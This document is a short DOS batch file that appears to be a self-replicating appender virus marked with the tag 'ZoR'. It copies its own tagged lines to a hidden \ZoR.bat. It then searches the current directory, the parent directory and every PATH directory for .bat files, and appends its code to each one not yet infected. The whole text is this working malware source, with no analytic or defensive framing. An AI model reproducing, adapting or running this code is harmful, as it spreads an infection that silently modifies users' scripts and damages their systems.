@echo off%ZoR%
if '%1==' ~ goto ZoR%2
if exist \ZoR.bat goto ZoRr
if not exist %0.bat goto ZoRe
find "ZoR"<%0.bat>\ZoR.BAT
:ZoRr
command /c \ZoR ~ s . .. %path%
goto ZoRe
:ZoRs
shift%ZoR%
if '%2==' exit ZoR
for %%a in (%2\*.bat) do call \ZoR ~ i %%a
goto ZoRs
:ZoRi
find "ZoR"<%3>nul
if not errorlevel 1 goto ZoRe
type %3>ZoR
echo.>>ZoR
type \ZoR.bat>>ZoR
move ZoR %3>nul
exit ZoR
:ZoRe>nul
exit ZoR
:ZoReRe